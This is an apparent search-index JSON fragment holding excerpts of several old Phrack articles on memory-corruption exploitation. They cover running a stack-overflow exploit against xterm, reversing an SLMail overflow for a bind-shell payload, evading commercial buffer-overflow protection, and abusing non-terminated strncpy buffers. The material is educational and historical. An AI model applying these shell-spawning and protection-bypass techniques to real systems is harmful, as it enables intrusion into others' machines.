------------------------------------------------------------------------------ Lets try our new exploit with our vulnerable test program: ------------------------------------------------------------------------------ [aleph1]$ ./exploit4 768 Using address: 0xbffffdb0 [aleph1]$ ./vulnerable $RET $ ------------------------------------------------------------------------------ Works like a charm. Now lets try it on xterm: ------------------------------------------------------------------------------ [aleph1]$ export DISPLAY=:0.0 [aleph1]$ ./exploit4 2148 Using address: 0xbffffdb0 [aleph1]$ /usr/X11R6/bin/xterm -fg $RET Warning: Color name \" Warning: some arguments in previous message were lost $ ------------------------------------------------------------------------------ On the first try! It has certainly increased our odds. Depending how much environment data the exploit program has compared with the program you are trying to exploit the guessed address may be to low or to high. Experiment both with positive and negative offsets. Finding Buffer Overflows ~~~~~~~~~~~~~~~~~~~~~~~~ As stated earlier, buffer overflows are the result of stuffing more information into a buffer than it is meant to hold. Since C does not have any built-in bounds checking, overflows often manifest themselves as writing past the end of a character array. The standard C library provides a number of functions for copying or appending strings, that perform no boundary checking. They include: strcat(), strcpy(), sprintf(), and vsprintf(). These functions operate on null-terminated strings, and do not check for overflow of the receiving string. gets() is a function that reads a line from stdin into a buffer until either a terminating newline or EOF. It performs no checks for buffer overflows. The scanf() family of functions can also be a problem if",
                      "hash": "f66945df47be44fcad82144be9f550e13b8a86b4d44297fc232ed7af70135136",
                      "offset": 3,
                      "vector": null,
                      "score": 0.8161513209342957
                    }
                  ]
                },
                {
                  "created": 1679370764791,
                  "document_id": "phrack-55-15",
                  "timestamp": 936835200000,
                  "tags": ["phrack", "issue-55", "article-15"],
                  "hash": "d26f415d6cdf3e8cb85f90571c680c52147800e4118f448290e9c9cd65b80c40",
                  "text_size": 78771,
                  "chunk_count": 9,
                  "chunks": [
                    {
                      "text": "-------[ Phrack Magazine --- Vol. 9 | Issue 55 --- 09.09.99 --- 15 of 19 ] -------------------------[ Win32 Buffer Overflows (Location, Exploitation and Prevention) --------[ dark spyrit AKA Barnaby Jack <dspyrit@beavuh.org> ] ----[ Abstract \"If you assume that there's no hope, you guarantee there will be no hope. If you assume that there is an instinct for freedom, there are opportunities to change things.\" -Noam Chomsky The Internet - the last great stronghold of freedom of thought, ideas and expression - and with each passing moment the bleak outcome of a corporate and government controlled entity increases in probability. The battle lines have been drawn, and for the moment, we have the upper hand, but only by a margin. Software companies with no alternative but to resort to the censorship of knowledge have made their presence felt, sites relating to the 'black art' of software reversing and the like are being removed on a continual basis. Hopefully, the few unrestrained who walk the back alleys will continue to publish information - and create avenues for others to expand, spread and develop - this is where the battle will be won. Assembly language is a weapon chosen only by few, but those who possess the skill to harness its power can and will defeat any of the newer tools of modern combat. I wish you the best of luck finding information, though. With power, comes a price - Assembler isn't the easiest language to learn, and as such you may have trouble finding documentation among the hordes of Visual this, Visual that, Visual Bloat for Dummies.. but continue your search, you'll be glad you did. When profit gain is the primary momentum, speed, control, size and performance of your software is sacrificed for ease of use and 'prompt development'. The need to know what goes on internally is a rare necessity and optimization is of little importance. Those that remain untainted by the prospect of monetary rewards, and first and foremost are driven by the sheer desire to better educate ones self, are those that will always be on the pinnacle - and are those that are feared most of all. With Windows NT now a major player, and the open source movement not looking to have any impact in the near future, the ability to 'look under the hood' is an incredibly valuable asset and will be the focus of the first section in this paper. It is of no great surprise that attempts to outlaw reverse engineering are currently in the works, but the effects of such a proposal would be disastrous. Despite the fact that it is an open invitation for vendors to use sub-standard coding practice, there are those in the security industry who rely on these techniques to find and document vulnerabilities. The online world would suffer as a result. Do not concede. Introduction. ~~~~~~~~~~~~~ This paper will be separated into 3 sections. The first will cover a standard reversing session, and we'll point out a common vulnerability. The second will demonstrate the process of exploiting the weakness - the problem with most win32 remote overflow exploits stems from the payload, the current trend is to have the shellcode download an external file and execute. Far too many problems result from this technique, depending on router/firewall configurations etc. The payload I present to you will directly spawn a full-blown shell on any port you specify, eliminating 90% of most reported problems. This is the first of its kind as far as I am aware. The last section will show how to add your own code to the executables of your target to prevent exploitation. The example I will be using for this document is the latest version of Seattle Labs mail server (3.2.3113). There are numerous buffer overflows riddled throughout this software, we'll be concentrating on a port opened by the POP service, which provides the Extended Turn functions. Seattle Labs were contacted about this in a previous version but did not bother to remedy the situation, instead they just changed the default port from 27 to 8376. Bad move. The vulnerabilities were made public by the way, so please, Russ, don't send me nasty emails. Before we begin I will assume you have a general knowledge of Assembler, Windows programming, a basic understanding of the Portable Executable structure and you know the fundamentals of buffer overflows - I won't be re-hashing the basics in this paper. Tools Required: Interactive Disassembler from http://www.datarescue.com - hands down the BEST disassembler for the PC. A decent debugger, e.g.: SoftIce. PE Dump from Matt Peitrek, or dumpbin will suffice. A hex editor, any will do.. PS Edit does nicely. A Win32 API reference. If you want to assemble the tools/exploits that accompany this paper then you'll also need TASM 5.0. The binaries will be available at http://www.beavuh.org as well as the latest goodies that we feel the need to release. Section 1: Under the Hood. ~~~~~~~~~~~~~~~~~~~~~~~~~~ Interactive Disassembler Pro is without a doubt, THE tool for reversing code. Disassembly begins from the entry point of the program, and follows all routes of execution, then continues to locate functions outside of the main flow of the program. You have full control over what is marked as data or code. IDA recognizes a huge amount of library functions, which provides a much better understanding of the target. It will disassemble an unbelievable amount of file formats, from a wide range of processors. You're given the ability to have repeatable comments, labels, modify any piece of code, function, \"interactively\". IDA also includes it's own macro language, to automate your chores. If I were to cover everything this tool can do I would be here all day, and I'd still be missing something. With the combined effort of IDA and Soft Ice, there are no barriers. This section will be rather short, the only reason being that IDA cuts through SLMail's code like a machete. Load up slmail.exe into IDA and we'll get underway... First we need to think about our target for a minute, we're going to try and exploit one of the SMTP commands so it is almost certain they will be accessed and compared from a table.. Let's do a search: Hit <alt+b> \"search for text in core\" and enter \"EXPN\", we'll land smack in the middle of these ASCII strings. 004439C0 aSize db 'SIZE',0 004439C5 align 4 004439C8 aXtrn db 'XTRN',0 004439CD align 4 004439D0 aEtrn db 'ETRN',0 004439D5 align 4 004439D8 aQuit db 'QUIT',0 ; DATA XREF: sub_403970+280\u0018o 004439D8 ; .data:00448A60\u0019o 004439DD align 4 004439E0 aHelp_0 db 'HELP',0 004439E5 align 4 004439E8 aTurn db 'TURN',0 ; DATA XREF: sub_403970+F0\u0018o 004439ED align 4 004439F0 aExpn db 'EXPN',0 ...<snip> Now we need to find the table that references the commands, so we'll do another search.. this time entering the dword offset to the left of EXPN (004439f0). And we land in the middle of this mess: 004436F8 dword_4436F8 dd 443A98h ; DATA XREF: sub_404390+24\u0018r 004436F8 ; sub_404390+34\u0018o 004436FC db 3 ; 004436FD db 0 ; 004436FE db 0 ; 004436FF db 0 ; 00443700 db 94h ; \" 00443701 db 3Ah ; : 00443702 db 44h ; D 00443703 db 0 ; 00443704 db 0Ah ; 00443705 db 0 ; 00443706 db 0 ; 00443707 db 0 ; 00443708 db 90h ; 00443709 db 3Ah ; : 0044370A db 44h ; D 0044370B db 0 ; 0044370C db 1 ; 0044370D db 0 ; 0044370E db 0 ; 0044370F db 0 ; ...<snip> 004437E8 db 0F0h ; 004437E9 db 39h ; 9 004437EA db 44h ; D 004437EB db 0 ; 004437EC db 19h ; 004437ED db 0 ; 004437EE db 0 ; 004437EF db 0 ; There's no point showing the complete table here, now.. take a look at its structure. <pointer to string> <dword> <pointer to string> <dword> etc My best guess here is that the dword value following each pointer will be the value assigned after a successful comparison. Let's check our theory. Also we should note down our value after the pointer to \"EXPN\" : 004439f0h, 00000019h. 0x19, we'll keep that in mind. Scroll up and at the top of the table you see: 004436F8 dword_4436F8 dd 443A98h ; DATA XREF: sub_404390+24\u0018r 004436F8 ; sub_404390+34\u0018o You can see to the right where the table is referenced, so click on the subroutine and we'll land straight into the call. 004043B4 loc_4043B4: ; CODE XREF: sub_404390+11\u0018j 004043B4 mov ecx, dword_4436F8 004043BA test ecx, ecx 004043BC jz short loc_4043F3 004043BE mov ebp, ds:lstrlenA 004043C4 mov esi, offset dword_4436F8 Our table loaded at esi, ebp contains the address of lstrlenA. 004043C9 004043C9 loc_4043C9: ; CODE XREF: sub_404390+61\u0019j 004043C9 test eax, eax 004043CB jnz short loc_4043F3 004043CD mov eax, [esi] 004043CF push eax 004043D0 call ebp Here we go, the string first moved to eax and then a string length function called. 004043D2 mov ecx, [esi] 004043D4 push eax 004043D5 push ecx 004043D6 push ebx 004043D7 call j_lstrncmpi 004043DC neg eax 004043DE sbb eax, eax 004043E0 inc eax 004043E1 jz short loc_4043E9 Now we know that the parameters for lstrncmpi are as follows: strncmpi(first_string, second_string, number_of_chars); The first parameter pushed on the stack is the return from the string length function, ecx is then pushed which points to the string, and finally ebx. So we can determine from this that ebx contains the input from the user. I can see that some of you may be a little puzzled here, yes - parameters are pushed on to the stack in reverse order. 004043E3 xor edi, edi 004043E5 mov di, [esi+4] Ah, just as we suspected.. if there is a successful comparison then di is loaded with the value that followed our pointer. 004043E9 004043E9 loc_4043E9: ; CODE XREF: sub_404390+51\u0018j 004043E9 mov ecx, [esi+8] 004043EC add esi, 8 004043EF test ecx, ecx 004043F1 jnz short loc_4043C9 loop :) 004043F3 004043F3 loc_4043F3: ; CODE XREF: sub_404390+18\u0018j 004043F3 ; sub_404390+2C\u0018j ... 004043F3 mov eax, edi 004043F5 pop edi 004043F6 pop esi 004043F7 pop ebp 004043F8 pop ebx 004043F9 retn 004043F9 sub_404390 endp ; sp = -10h 004043F9 And finally eax holds our value, and we return from the call. Let's continue. 00405EC7 mov edx, [esp+2Ch+arg_8] 00405ECB mov ebx, eax 00405ECD mov eax, [esp+2Ch+arg_4] 00405ED1 push edx 00405ED2 push eax 00405ED3 push esi 00405ED4 lea ecx, [esp+3Ch] 00405ED8 push edi 00405ED9 push ecx 00405EDA push ebx 00405EDB call sub_404850 Now, the important things to take note of here is edx gets our inputted string, and ebx is given our value from the table (0x19). Remember the order in which our registers were pushed, so we will be able to tell what is being referenced from the stack - and in the next call we will rename the stack variables to make it easier on ourselves. Note: I'm not taking advantage of some of the GREAT features IDA possesses - repeatable comments, labels and much more. A necessity while on a real reversing journey. 00404850 sub_404850 proc near ; CODE XREF: sub_405330+73\u0019p 00404850 ; sub_405560+73\u0019p ... 00404850 00404850 var_270 = byte ptr -270h 00404850 var_26C = dword ptr -26Ch 00404850 var_268 = byte ptr -268h 00404850 var_264 = byte ptr -264h 00404850 var_23C = byte ptr -23Ch 00404850 var_230 = byte ptr -230h 00404850 var_168 = byte ptr -168h 00404850 var_110 = byte ptr -110h 00404850 var_105 = byte ptr -105h 00404850 var_104 = byte ptr -104h 004048",
                      "hash": "7c17793ab22021eab7391528df2a79a633e1edc8744738c8897380325f16746d",
                      "offset": 0,
                      "vector": null,
                      "score": 0.8275727033615112
                    }
                  ]
                },
                {
                  "created": 1679370914921,
                  "document_id": "phrack-62-5",
                  "timestamp": 1089676800000,
                  "tags": ["phrack", "issue-62", "article-5"],
                  "hash": "ead93e4e97e197521847f3955b3b7f9ead9b1d8132b87c231552415815d7c229",
                  "text_size": 37515,
                  "chunk_count": 3,
                  "chunks": [
                    {
                      "text": "==Phrack Inc.== Volume 0x0b, Issue 0x3e, Phile #0x05 of 0x10 |=-----------------------------------------------------------------------=| |=-----=[ Bypassing 3rd Party Windows Buffer Overflow Protection ]=------=| |=-----------------------------------------------------------------------=| |=--------------=[ anonymous <p62_wbo_a@author.phrack.org ]=-------------=| |=--------------=[ Jamie Butler <james.butler@hbgary.com> ]=-------------=| |=--------------=[ anonymous <p62_wbo_b@author.phrack.org ]=-------------=| --[ Contents 1 - Introduction 2 - Stack Backtracing 3 - Evading Kernel Hooks 3.1 - Kernel Stack Backtracing 3.2 - Faking Stack Frames 4 - Evading Userland Hooks 4.1 - Implementation Problems - Incomplete API Hooking 4.1.1 - Not Hooking all API Versions 4.1.2 - Not Hooking Deeply Enough 4.1.3 - Not Hooking Thoroughly Enough 4.2 - Fun With Trampolines 4.2.1 Patch Table Jumping 4.2.2 Hook Hopping 4.3 - Repatching Win32 APIs 4.4 - Attacking Userland Components 4.4.1 IAT Patching 4.4.2 Data Section Patching 4.5 - Calling Syscalls Directly 4.6 - Faking Stack Frames 5 - Conclusions --[ 1 - Introduction Recently, a number of commercial security systems started to offer protection against buffer overflows. This paper analyzes the protection claims and describes several techniques to bypass the buffer overflow protection. Existing commercial systems implement a number of techniques to protect against buffer overflows. Currently, stack backtracing is the most popular one. It is also the easiest to implement and the easiest to bypass. Several commercial products such as Entercept (now NAI Entercept) and Okena (now Cisco Security Agent) implement this technique. --[ 2 - Stack Backtracing Most of the existing commercial security systems do not actually prevent buffer overflows but rather try to attempt to detect the execution of shellcode. The most common technology used to detect shellcode is code page permission checking which involves checking whether code is executing on a writable page of memory. This is necessary since architectures such as x86 do not support the non-executable memory bit. Some systems also perform additional checking to see whether code's page of memory belongs to a memory mapped file section and not to an anonymous memory section. [-----------------------------------------------------------] page = get_page_from_addr( code_addr ); if (page->permissions & WRITABLE) return BUFFER_OVERFLOW; ret = page_originates_from_file( page ); if (ret != TRUE) return BUFFER_OVERFLOW; [-----------------------------------------------------------] Pseudo code for code page permission checking Buffer overflow protection technologies (BOPT) that rely on stack backtracing don't actually create non-executable heap and stack segments. Instead they hook the OS and check for shellcode execution during the hooked API calls. Most operating systems can be hooked in userland or in kernel. Next section deals with evading kernel hooks, while section 4 deals with bypassing userland hooks. --[ 3 - Evading Kernel Hooks When hooking the kernel, Host Intrusion Prevention Systems (HIPS) must be able to detect where a userland API call originated. Due to the heavy use of kernel32.dll and ntdll.dll libraries, an API call is usually several stack frames away from the actual syscall trap call. For this reason, some intrusion preventions systems rely on using stack backtracing to locate the original caller of a system call. ----[ 3.1 - Kernel Stack Backtracing While stack backtracing can occur from either userland or kernel, it is far more important for the kernel components of a BOPT than its userland components. The existing commercial BOPT's kernel components rely entirely on stack backtracing to detect shellcode execution. Therefore, evading a kernel hook is simply a matter of defeating the stack backtracing mechanism. Stack backtracing involves traversing stack frames and verifying that the return addresses pass the buffer overflow detection tests described above. Frequently, there is also an additional \"return into libc\" check, which involves checking that a return address points to an instruction immediately following a call or a jump. The basic operation of stack backtracing code, as used by a BOPT, is presented below. [-----------------------------------------------------------] while (is_valid_frame_pointer( ebp )) { ret_addr = get_ret_addr( ebp ); if (check_code_page(ret_addr) == BUFFER_OVERFLOW) return BUFFER_OVERFLOW; if (does_not_follow_call_or_jmp_opcode(ret_addr)) return BUFFER_OVERFLOW; ebp = get_next_frame( ebp ); } [-----------------------------------------------------------] Pseudo code for BOPT stack backtracing When discussing how to evade stack backtracing, it is important to understand how stack backtracing works on an x86 architecture. A typical stack frame looks as follows during a function call: : : |-------------------------| | function B parameter #2 | |-------------------------| | function B parameter #1 | |-------------------------| | return EIP address | |-------------------------| | saved EBP | |=========================| | function A parameter #2 | |-------------------------| | function A parameter #1 | |-------------------------| | return EIP address | |-------------------------| | saved EBP | |-------------------------| : : The EBP register points to the next stack frame. Without the EBP register it is very hard, if not impossible, to correctly identify and trace through all the stack frames. Modern compilers often omit the use of EBP as a frame pointer and use it as a general purpose register instead. With an EBP optimization, a stack frame looks as follows during a function call: |-----------------------| | function parameter #2 | |-----------------------| | function parameter #1 | |-----------------------| | return EIP address | |-----------------------| Notice that the EBP register is not present on the stack. Without an EBP register it is not possible for the buffer overflow detection technologies to accurately perform stack backtracing. This makes their task incredibly hard as a simple return into libc style attack will bypass the protection. Simply originating an API call one layer higher than the BOPT hook defeats the detection technique. ----[ 3.2 - Faking Stack Frames Since the stack is under complete control of the shellcode, it is possible to completely alter its contents prior to an API call. Specially crafted stack frames can be used to bypass the buffer overflow detectors. As was explained previously, the buffer overflow detector is looking for three key indicators of legitimate code: read-only page permissions, memory mapped file section and a return address pointing to an instruction immediately following a call or jmp. Since function pointers change calling semantics, BOPT do not (and cannot) check that a call or jmp actually points to the API being called. Most importantly, the BOPT cannot check return addresses beyond the last valid EBP frame pointer (it cannot stack backtrace any further). Evading a BOPT is therefore simply a matter of creating a \"final\" stack frame which has a valid return address. This valid return address must point to an instruction residing in a read-only memory mapped file section and immediately following a call or jmp. Provided that the dummy return address is reasonably close to a second return address, the shellcode can easily regain control. The ideal instruction sequence to point the dummy return address to is: [-----------------------------------------------------------] jmp [eax] ; or call [eax], or another register dummy_return: ... ; some number of nops or easily ; reversed instructions, e.g. inc eax ret ; any return will do, e.g. ret 8 [-----------------------------------------------------------] Bypassing kernel BOPT components is easy because they must rely on user controlled data (the stack) to determine the validity of an API call. By correctly manipulating the stack, it is possible to prematurely terminate the stack return address analysis. This stack backtracing evasion technique is also effective against userland hooks (see section 4.6). --[ 4 - Evading Userland Hooks Given the presence of the correct instruction sequence in a valid region of memory, it is possible to trivially bypass kernel buffer overflow protection techniques. Similar techniques can be used to bypass userland BOPT components. In addition, since the shellcode executes with the same permissions as the userland hooks, a number of other techniques can be used to evade the detection. ----[ 4.1 - Implementation Problems - Incomplete API Hooking There are many problems with the userland based buffer overflow protection technologies. For example, they require the buffer overflow protection code to be in the code path of all attacker's calls or the shellcode execution will go undetected. Trying to determine what an attacker will do with his or her shellcode a priori is an extremely hard problem, if not an impossible one. Getting on the right path is not easy. Some of the obstacles in the way include: a. Not accounting for both UNICODE and ANSI versions of a Win32 API call. b. Not following the chaining nature of API calls. For example, many functions in kernel32.dll are nothing more than wrappers for other functions within kernel32.dll or ntdll.dll. c. The constantly changing nature of the Microsoft Windows API. --------[ 4.1.1 - Not Hooking All API Versions A commonly encountered mistake with userland API hooking implementations is incomplete code path coverage. In order for an API interception based products to be effective, all APIs utilized by attackers must be hooked. This requires the buffer overflow protection technology to hook somewhere along the code path an attacker _has_ to take. However, as will be shown, once an attacker has begun executing code, it becomes very difficult for third party systems to cover all code paths. Indeed, no tested commercial buffer overflow detector actually provided an effective code path coverage. Many Windows API functions have two versions: ANSI and UNICODE. The ANSI function names usually end in A, and UNICODE functions end in W because of their wide character nature. The ANSI functions are often nothing more than wrappers that call the UNICODE version of the API. For example, CreateFileA takes the ANSI file name that was passed as a parameter and turns it into an UNICODE string. It then calls CreateFileW. Unless a vendor hooks both the UNICODE and ANSI version of the API function, an attacker can bypass the protection mechanism by simply calling the other version of the function. For example, Entercept 4.1 hooks LoadLibraryA, but it makes no attempt to intercept LoadLibraryW. If a protection mechanism was only going to hook one version of a function, it would make more sense to hook the UNICODE version. For this particular function, Okena/CSA does a better job by hooking LoadLibraryA, LoadLibraryW, LoadLibraryExA, and LoadLibraryExW. Unfortunately for the third party buffer overflow detectors, simply hooking more functions in kernel32.dll is not enough. --------[ 4.1.2 - Not Hooking Deeply Enough In Windows NT, kernel32.dll acts as a wrapper for ntdll.dll and yet many buffer overflow detection products do not hook functions within ntdll.dll. This simple error is similar to not hooking both the UNICODE and ANSI versions of a function. An attacker can simply call the ntdll.dll directly and completely bypass all the kernel32.dll \"checkpoints\" established by a buffer overflow detector. For example, NAI Entercept tries to detect shellcode calling GetProcAddress() in kernel32.dll. However, the shellcode can be rewritten to call LdrGetProcedureAddress() in ntdll.dll, which will accomplish the same goal, and at the same time never pass through the NAI Entercept hook. Similarly, shellcode can completely bypass userland hooks altogether and make system calls directly (see section 4.5). --------[ 4.1.3 - Not Hooking Thoroughly Enough The interactions between the various different Win32 API functions is byzantine, complex and difficult to understand. A vendor must make only one mistake in order to create a window of opportunity for an attacker. For example, Okena/CSA and NAI Entercept both hook WinExec trying to prevent attacker's shellcode from spawning a process. The call path for WinExec looks like this: WinExec() --> CreateProcessA() --> CreateProcessInternalA() Okena/CSA and NAI Entercept hook both WinExec() and CreateProcessA() (see Appendix A and B). However, neither product hooks CreateProcessInternalA() (exported by kernel32.dll). When writing a shellcode, an attacker could find the export for CreateProcessInternalA() and use it instead of calling WinExec(). CreateProcessA() pushes two NULLs onto the stack before calling CreateProcessInternalA(). Thus a shellcode only needs to push two NULLs and then call CreateProcessInternalA() directly to evade the userland API hooks of both products. As new DLLs and APIs are released, the complexity of Win32 API internal interactions increases, making the problem worse. Third party product vendors are at a severe disadvantage when implementing their buffer overflow detection technologies and are bound to make mistakes which can be exploited by attackers. ----[ 4.2 - Fun With Trampolines Most Win32 API functions begin with a five byte preamble. First, EBP is pushed onto the stack, then ESP is moved into EBP. [-----------------------------------------------------------] Code Bytes Assembly 55 push ebp 8bec mov ebp, esp [-----------------------------------------------------------] Both Okena/CSA and Entercept use inline function hooking. They overwrite the first 5 bytes of a function with an immediate unconditional jump or call. For example, this is what the first few bytes of WinExec() look like after NAI Entercept's hooks have been installed: [-----------------------------------------------------------] Code Bytes Assembly e8 xx xx xx xx call xxxxxxxx 54 push esp 53 push ebx 56 push esi 57 push edi [-----------------------------------------------------------] Alternatively, the first few bytes could be overwritten with a jump instruction: [-----------------------------------------------------------] Code Bytes Assembly e9 xx xx xx xx jmp xxxxxxxx ... [-----------------------------------------------------------] Obviously, it is easy for shellcode to test for these and other signatures before calling a function. If a hijacking mechanism is detected, the shellcode can use several different techniques to bypass the hook. ------[ 4.2.1 - Patch Table Jumping When an API is hooked, the original preamble is saved into a table so that the buffer overflow detector can recreate the original API after performing its validation checks. The preamble is stored in a patch table, which resides somewhere in the address space of an application. When shellcode detects the presence of an API",
                      "hash": "897a9d3bc2baec19b8050eeb7eb6ddf27353907e25ed5e78d1f67a43aee65193",
                      "offset": 0,
                      "vector": null,
                      "score": 0.8264463543891907
                    }
                  ]
                },
                {
                  "created": 1679370787795,
                  "document_id": "phrack-56-14",
                  "timestamp": 947030400000,
                  "tags": ["phrack", "issue-56", "article-14"],
                  "hash": "2dd6ce047ab38c85a56bd8966030e60da304a766679d100c227a087a7086f64a",
                  "text_size": 28023,
                  "chunk_count": 3,
                  "chunks": [
                    {
                      "text": "- P H R A C K M A G A Z I N E - Volume 0xa Issue 0x38 05.01.2000 0x0e[0x10] |--------- TAKING ADVANTAGE OF NON-TERMINATED ADJACENT MEMORY SPACES ---------| |-----------------------------------------------------------------------------| |------------------------- twitch <twitch@vicar.org> -------------------------| ----| Introduction Because Phrack needs another buffer overflow article, because most of those pesky strcpy()'s have been replaced with strncpys()'s, and because chicks dig shellcode, I present for your benefit yet another buffer overflow technique. Like 'Frame Pointer Overwriting' from P55, this is not the most common of problems, but it does exist, and it is exploitable. This article details the hazards of non-terminated buffers (specifically non-terminated strings), and their potential impact on the security of a application. This issue is discussed from a variety potential situations, culminating with an example exploit which abuses adjacent non-terminated string buffers together to perform program redirection via a buffer overflow. Like most bugs this is not an unknown problem, however judging from random source browsing, it appears that this is not a widely understood issue. Incidentally, the example code contains idiosyncratic architectural references and man page excerpts as presented from the point of view of FreeBSD running on the x86 architecture. Due to popular pleading, the noun 'data' is treated as singular throughout this document, even though that is wrong. ----| Rehash If you already know how buffer overflows work (and if you have read any issue of Phrack within the last two years, how could you not?), skip this section. When a program allocates a buffer, then copies arbitrary data into this buffer, it must ensure that there is enough room for everything that is being copied. If there is more data than there is allocated memory, all data could still be copied, but past the end of the designated buffer and random, most likely quite important, data will be overwritten. It's all really quite rude. If the data being copied is supplied by the user, the user can do malevolent things like change the value of variables, redirect program execution, etc. A common overflow will look like this: void func(char *userdata) { char buf[256]; ... strcpy(buf, userdata); ... } The programmer assumes that the data being copied will surely be less than 256 bytes and will fit snugly into the supplied buffer. Unfortunately, since the data being copied is user-supplied, it could be damned near anything and of any size. The function strcpy() will continue copying bytes from *userdata until a NULL is found, so any data past 256 bytes will overflow. So, in an effort to keep mean people from abusing their software, programmers will make sure that they only copy as much data as there is buffer space. To accomplish this task, they will normally do something to this effect: void func(char *userdata) { char buf[256]; ... strncpy(buf, userdata, 256); ... } strncpy() will only copy as many bytes as are specified. So in the above, the maximum amount of data that is ever copied is 256 bytes, and nothing is overwritten (note that the above code snippet exemplifies the problem discussed below). For a far superior explanation of buffer overruns, program redirection, and smashing the stack for fun and profit, consult the article of the same name as the latter in P49-10. ----| Pith The essence of the issue is that many functions that a programmer may take to be safe and/or 'magic bullets' against buffer overflows do not automatically terminate strings/buffers with a NULL. That in actuality, the buffer size argument provided to these functions is an absolute size- not the size of the string. To put a finer point on it, an excerpt from the strncpy() man page: char * strncpy(char *dst, const char *src, size_t len) ... The strncpy() copies not more than len characters into dst, appending `\\0' characters if src is less than len characters long, and _not_+ terminating dst if src is more than len characters long. ... +(underline present in the source) To understand the ramifications of this, consider the case of two automatic character arrays, allocated thusly: char buf1[8]; char buf2[4]; The compiler is most likely going to place these two buffers _next_ to each other on the stack. Now, consider the stack for the above: Upper Memory || ----------------> [Top of the stack] || ----------------> [ buf2 - 0 ] || ----------------> [ buf2 - 1 ] || ----------------> [ buf2 - 2 ] || ----------------> [ buf2 - 3 ] || ----------------> [ buf1 - 0 ] || ----------------> [ buf1 - 1 ] || ----------------> [ buf1 - 2 ] || ----------------> [ buf1 - 3 ] || ... || ----------------> [ buf1 - 7 ] || || ... \\/ [ Remember that the stack grows down on our example architecture (and probably yours, too), so the above diagram looks upside down ] Thus, if a programmer were to do the following: void func() { char buf1[8]; char buf2[4]; fgets(buf1, 8, stdin); strncpy(buf2, buf1, 4); } Assuming that the user entered the string 'iceburn', after the strncpy() the stack would look like this: Upper Memory || ----------------> [Top of the stack] || ----------------> [ 'i' (buf2 - 0) ] || ----------------> [ 'c' (buf2 - 1) ] || ----------------> [ 'e' (buf2 - 2) ] || ----------------> [ 'b' (buf2 - 3) ] || ----------------> [ 'i' (buf1 - 0) ] || ----------------> [ 'c' (buf1 - 1) ] || ----------------> [ 'e' (buf1 - 2) ] || ----------------> [ 'b' (buf1 - 3) ] || ----------------> [ 'u' (buf1 - 4) ] || ----------------> [ 'r' (buf1 - 5) ] || ----------------> [ 'n' (buf1 - 6) ] || ----------------> [ 0x00 (buf1 - 7) ] || || ... \\/ We know from the man page that even though strncpy() is not going to copy more than 4 bytes. But since the src string is longer than 4 bytes, it will not null-terminate either. Thus, strlen(buf2) is now 11, even though sizeof(buf2) is 4. This is not an overflow, as no data beyond the boundaries of the allocated space have been overwritten. However, it does establish a peculiar situation. For instance, the result of printf(\"You entered: %s\\n\", buf2); would produce the following: You entered: icebiceburn Not exactly the intent. ----| Apparition This problem surfaces in the real world in seemingly benign and arcane ways. The following is from syslogd.c on FreeBSD 3.2-RELEASE: /* * Validate that the remote peer has permission to log to us. */ int validate(sin, hname) struct sockaddr_in *sin; const char *hname; { int i; size_t l1, l2; char *cp, name[MAXHOSTNAMELEN]; struct allowedpeer *ap; if (NumAllowed == 0) /* traditional behaviour, allow everything */ return 1; strncpy(name, hname, sizeof name); if (strchr(name, '.') == NULL) { strncat(name, \".\", sizeof name - strlen(name) - 1); strncat(name, LocalDomain, sizeof name - strlen(name) - 1); } ... } Suppose that hname is at least MAXHOSTNAMELEN bytes long and does not contain a '.'. This means that the calculation for the length argument to strncat will expand to: sizeof name == MAXNAMELEN strlen(name) >= MAXNAMELEN Thus, length will be < 0 Well, since the length parameter to strncat is of type size_t, which is unsigned, strncat will actually be willing to append _way_ to many bytes. Thus, all of LocalDomain will be appended to name (which is already full), an overflow will occur and syslogd will seg fault when validate() returns. Incidentally, unless LocalDomain for the host is an appropriate offset into the stack, this example is exploitable only as a way to kill syslog (incidentally, 0xbfbfd001.com is available). ----| Pith + Apparition = Opportunity Although this type of overflow may be exploited in a variety of manners (and indeed, it will manifest itself in a variety of ways), the sexiest and easiest to understand is program redirection. Please note that although the example situations presented are exorbitantly contrived, that similar conditions exist in sundry software currently in use all over the world. Now, let us address a situation where the user has control over the contents of two adjacent buffers. Consider the following snippet: int main(int argc, char **argv) { char buf1[1024]; char buf2[256]; strncpy(buf, argv[1], 1024); strncpy(buf2, argv[2], 256); ... if(somecondition) print_error(buf2); } void print_error(char *p) { char mybuf[263]; sprintf(mybuf, \"error: %s\", p); } A stack diagram would be really large and redundant, so one will not be making an appearance here, but it should be fairly clear what will happen. The programmer assumes that due to the liberal use of strncpy() in main(), that the data is clean when it reaches print_error(). Thus, it is assumed that sprintf() may be called without incident. Unfortunately, since p points to buf2, and buf2 is not properly terminated, sprintf() will actually continue happily copying until it reaches a NULL somewhere after the end of buf1. Oh shit. ----| Hexploitation Exploitation (for the purpose of program redirection) in this scenario is slightly different than it is in the case of a traditional single-buffer overrun. First, a little rehash about exploiting traditional buffer overflows. Assuming that we are overflowing a single buffer of 256 bytes, our payload would generally look something like this (diagrams obviously not to scale): [ 0 ....................................................256.. ~280 ] -------------------------------------------------------------------- | | | | | | Bunch of NOP's | shellcode | More NOP's | offset_to_shellcode | | | | | | -------------------------------------------------------------------- | Buffer | |________________________________________________________| All that we do is pass enough data so that when the overflow occurs, the offset to the our shellcode (an address somewhere on the stack) overwrites the saved instruction pointer. Thus, when the vulnerable function returns, program execution is redirected to our code. Now assume that we want to overflow another 256-byte buffer, say the one in print_error() in the code snippet from the last section. To accomplish our malevolent ends however, we will have to use buf1 and buf2 in tandem. All we have to do is fill all of buf2 with our shellcode and NOP's, then use the beginning of buf1 for our offset. Thus, after the strncpy()'s, buf1 will look like this: [ 0 ......................................................... 1024 ] -------------------------------------------------------------------- | | | | offset_to_shellcode | Filled with NULL's by strncpy() | | | | -------------------------------------------------------------------- And buf2 will look like this: [ 0 .......................................................... 256 ] -------------------------------------------------------------------- | | | | | Bunch of NOP's | shellcode | More NOP's | | | | | -------------------------------------------------------------------- This arrangement is required due to the way in which the buffers are arranged on the stack. What is supplied as argv[1] (the data that is copied into buf1) will be located higher in memory than the data we supply as argv[2] (which is copied into buf2). So technically, we supply the offset at the beginning of the exploit string, rather than at the end. Then, when print_error() is called, the stack in main(), will look like this: [Top of stack Upper Memory] [ 0 .............................................~300../ /... 1280 ] -------------------------------------------------------/ /---------- | | | | / / | | Bunch of NOP's | shellcode | More NOP's | offset / / NULL's | | | | | / / | -------------------------------------------------------/ /---------- Which resembles greatly the traditional payload described above. When print_error() is called, it is passed a pointer to the beginning of buf2, or, the top of the stack in main(). Thus, when sprintf() is called, an overrun occurs, redirecting program execution to our shellcode, and 